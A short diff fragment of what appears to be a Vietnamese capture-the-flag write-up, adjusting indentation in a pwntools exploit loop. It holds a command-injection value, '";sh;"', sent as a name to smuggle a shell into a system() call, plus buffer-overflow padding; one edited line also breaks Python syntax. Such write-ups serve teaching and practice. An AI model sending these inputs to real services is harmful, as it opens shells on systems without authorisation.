@@ -57,7 +57,7 @@ Nhưng sau 1 lúc chạy thì thấy địa chỉ `printff` luôn có BYTE cuố
 
 
         while(1):
-             ...
+            ...
                 p.sendlineafter(b'Your Name is:',b'";sh;"')    //đưa sh vào system
                 
                 payload=b'A'*32
@@ -72,8 +72,7 @@ Nhưng sau 1 lúc chạy thì thấy địa chỉ `printff` luôn có BYTE cuố
 					break
 	        	except:
 		           try:
-					  p.close()
-				except:
+				   p.close()except:
 					  pass
 
 # Script python
